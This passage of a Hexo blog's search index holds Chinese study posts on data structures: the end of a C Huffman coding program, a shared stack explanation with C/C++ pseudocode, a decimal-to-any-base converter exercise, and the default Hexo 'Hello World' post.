第一次打印该编码时，在最后不需要加换行符</span><br>            first = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (root-&gt;left) &#123; <span class="hljs-comment">// 遍历左子树，将路径加入数组，并递归遍历子树</span><br>        arr[top] = <span class="hljs-number">0</span>;<br>        printCodes(root-&gt;left, arr, top + <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (root-&gt;right) &#123; <span class="hljs-comment">// 遍历右子树，将路径加入数组，并递归遍历子树</span><br>        arr[top] = <span class="hljs-number">1</span>;<br>        printCodes(root-&gt;right, arr, top + <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> characters[MAX_CHARACTERS];<br>    <span class="hljs-type">int</span> frequencies[MAX_CHARACTERS] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">int</span> n;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the number of characters: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter %d characters: &quot;</span>, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot; %c&quot;</span>, &amp;characters[i]);<br>        frequencies[(<span class="hljs-type">int</span>)characters[i]]++;<br>    &#125;<br><br>    <span class="hljs-type">int</span> L_chars = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CHARACTERS; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (frequencies[i] &gt; <span class="hljs-number">0</span>) &#123;<br>            L_chars++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">char</span> L_characters[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">int</span> L_frequencies[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CHARACTERS; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (frequencies[i] &gt; <span class="hljs-number">0</span>) &#123;<br>            L_characters[index] = (<span class="hljs-type">char</span>)i;<br>            L_frequencies[index] = frequencies[i];<br>            index++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">root</span> =</span> buildHuffmanTree(L_characters, L_frequencies, L_chars);<br><br>    <span class="hljs-type">int</span> arr[MAX_CHARACTERS], top_index = <span class="hljs-number">0</span>;<br>    printCodes(root, arr, top_index);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/../img/%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81.png"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 哈夫曼编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>共享栈</title>
      <link href="/2023/10/23/%E5%85%B1%E4%BA%AB%E6%A0%88/"/>
      <url>/2023/10/23/%E5%85%B1%E4%BA%AB%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<p>共享栈是一种特殊的栈结构，它允许两个栈共享同一段物理内存区域。共享栈有两个栈顶指针，分别称为top 1和top 2，它们分别指向两个栈的栈顶元素。在共享栈中，两个栈可以分别从两端向中间生长，当它们的栈顶指针相遇时，表示共享栈已满。</p><p>下面是共享栈的基本操作：</p><ol><li>初始化（Init）：创建一个空的共享栈，并初始化top 1和top 2指针为-1，表示两个栈为空。</li><li>入栈（Push）：<ul><li>当要插入元素到栈1时，先检查top 1是否小于top 2-1，如果是，则将元素插入top 1位置，top 1加1。</li><li>当要插入元素到栈2时，先检查top 1是否小于top 2-1，如果是，则将元素插入top 2位置，top 2减1。</li></ul></li><li>出栈（Pop）：<ul><li>当要从栈1中出栈时，首先检查top 1是否不等于-1，如果是，则将top 1位置的元素弹出，并将top 1减1。</li><li>当要从栈2中出栈时，首先检查top 2是否不等于-1，如果是，则将top 2位置的元素弹出，并将top 2加1。</li></ul></li><li>判空（Is Empty）：检查top 1和top 2是否都为-1，如果是，则共享栈为空。</li><li>判满（Is Full）：检查top 1和top 2是否相差为1，如果是，则共享栈已满。</li><li>获取栈顶元素（Top）：<ul><li>当要获取栈1的栈顶元素时，首先检查top 1是否不等于-1，如果是，则返回top 1位置的元素。</li><li>当要获取栈2的栈顶元素时，首先检查top 2是否不等于-1，如果是，则返回top 2位置的元素。</li></ul></li></ol><p>以下是共享栈的伪代码实现，包括初始化、入栈、出栈和获取栈顶元素等操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElemType data[MAX_SIZE];<br>    <span class="hljs-type">int</span> top1;  <span class="hljs-comment">// 第一个栈的栈顶指针</span><br>    <span class="hljs-type">int</span> top2;  <span class="hljs-comment">// 第二个栈的栈顶指针</span><br>&#125; SharedStack;<br><span class="hljs-comment">//栈满条件：top1 + 1 = top2</span><br><br><span class="hljs-comment">// 初始化共享栈</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">initSharedStack</span><span class="hljs-params">(SharedStack &amp;S)</span> </span><br><span class="hljs-function"></span>&#123;<br>    S.top1 = <span class="hljs-number">-1</span>;<br>    S.top2 = MAX_SIZE;<br>&#125;<br><br><span class="hljs-comment">// 第一个栈的入栈</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">pushStack1</span><span class="hljs-params">(SharedStack &amp;S, ElemType x)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (S.top1 + <span class="hljs-number">1</span> &lt; S.top2) <br>    &#123;<span class="hljs-comment">//指针先加1，再入栈</span><br>        S.top1++;<br>        S.data[S.top1] = x;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈已满，无法进行入栈操作\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 第一个栈的出栈</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">popStack1</span><span class="hljs-params">(SharedStack &amp;S, ElemType &amp;x)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (S.top1 &gt;= <span class="hljs-number">0</span>) <br>    &#123;<span class="hljs-comment">//先出栈，指针再减1</span><br>        x = S.data[S.top1];<br>        S.top1--;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 表示栈为空</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 第二个栈的入栈</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">pushStack2</span><span class="hljs-params">(SharedStack &amp;S, ElemType x)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (S.top2 - <span class="hljs-number">1</span> &gt; S.top1) <br>    &#123;<span class="hljs-comment">//指针先减1，再入栈</span><br>        S.top2--;<br>        S.data[S.top2] = x;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈已满，无法进行入栈操作\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 第二个栈的出栈</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">popStack2</span><span class="hljs-params">(SharedStack &amp;S, ElemType &amp;x)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (S.top2 &lt; MAX_SIZE) <br>    &#123;<span class="hljs-comment">//先入栈，指针再加1</span><br>        x = S.data[S.top2];<br>        S.top2++;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈已空，无法进行出栈操作\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 表示栈为空</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 获取栈顶元素</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getTopElement</span><span class="hljs-params">(SharedStack S, ElemType &amp;x)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (S.top1 &gt;= <span class="hljs-number">0</span>) <br>    &#123;<br>       <span class="hljs-keyword">return</span> S.data[S.top1];<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (S.top2 &lt; MAX_SIZE) <br>    &#123;<br>        <span class="hljs-keyword">return</span> S.data[S.top2];<br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈已空，无栈顶元素\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 表示栈为空</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转换函数</title>
      <link href="/2022/11/15/work1/"/>
      <url>/2022/11/15/work1/</url>
      
        <content type="html"><![CDATA[<h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><h5 id="实现十进制数字到任意进制的转换函数"><a href="#实现十进制数字到任意进制的转换函数" class="headerlink" title="实现十进制数字到任意进制的转换函数:"></a>实现十进制数字到任意进制的转换函数:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">baseConverter</span><span class="hljs-params">(<span class="hljs-type">int</span> dec,<span class="hljs-type">int</span> base)</span>;<br><span class="hljs-comment">//其中base为转换的基数</span><br><span class="hljs-comment">//示例：</span><br>--&gt;input   :<span class="hljs-number">250</span>, <span class="hljs-number">16</span><br>--&gt;output  :FA<br></code></pre></td></tr></table></figure><h4 id="查资料："><a href="#查资料：" class="headerlink" title="查资料："></a>查资料：</h4><p>基数：在一种数制中，只能使用一组固定的数字来表示数的大小，这组固定的数字的个数就称为该计数制的基数（Base）。例如十进制的基数为10，二进制的基数为2等。</p><p>权：又称为位权或权值，即每一个数位都有一个固定的基值与之相对应，称之为权。如十进制的个位对应的权值为1（100），十位对应的权值为10（101），百位对应的权值为100（102）。对于一个 M 进制的数来说，小数点左边各位上对应的权值从右到左分别为基数的0次方、基数的1次方、基数的2次方等，对于小数点右边各位上对应的权值从左到右分别为基数的-1次方、基数的-2次方等。<br>二进制、八进制、十六进制向十进制转换：按权展开相加。<br>十进制转换成二进制、八进制、十六进制：整数部分除以基数取余数（取余的方向为从后向前）；小数部分乘以基数取整数（取整的方向为从前向后）。<br>二进制、八进制、十六进制相互转换：先转换成十进制再转换成其他进制；或者按照其对应关系进行转换（三位二进制数对应一位八进制数，四位二进制数对应一位十六进制数）。</p><h4 id="算法设计："><a href="#算法设计：" class="headerlink" title="算法设计："></a>算法设计：</h4><p>十六进制是由 0~F 这一组固定的数字来表示，所以釆用字符数组进行存储。<br>在执行程序时可以输入多组数据来验证程序的正确性</p><h4 id="程序源码："><a href="#程序源码：" class="headerlink" title="程序源码："></a>程序源码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">baseConverter</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j, num[<span class="hljs-number">20</span>];<br><span class="hljs-type">char</span> k[] = &#123; <span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span> &#125;;<br><span class="hljs-keyword">do</span> &#123;<br>i++;<br>num[i] = a % b;<br>a /= b;<br>&#125; <span class="hljs-keyword">while</span> (a != <span class="hljs-number">0</span>);<br><span class="hljs-keyword">for</span> (j = i; j &gt;= <span class="hljs-number">1</span>; j--)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, k[num[j]]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i,j;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d,%d&quot;</span>, &amp;i, &amp;j);<br>baseConverter(i,j);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="运行实例："><a href="#运行实例：" class="headerlink" title="运行实例："></a>运行实例：</h4><p><img src="/../img/1.png"></p><p><img src="/../img/2.png"></p>]]></content>
      
      
      <categories>
          
          <category> first </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/10/13/hello-world/"/>
      <url>/2022/10/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> first </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
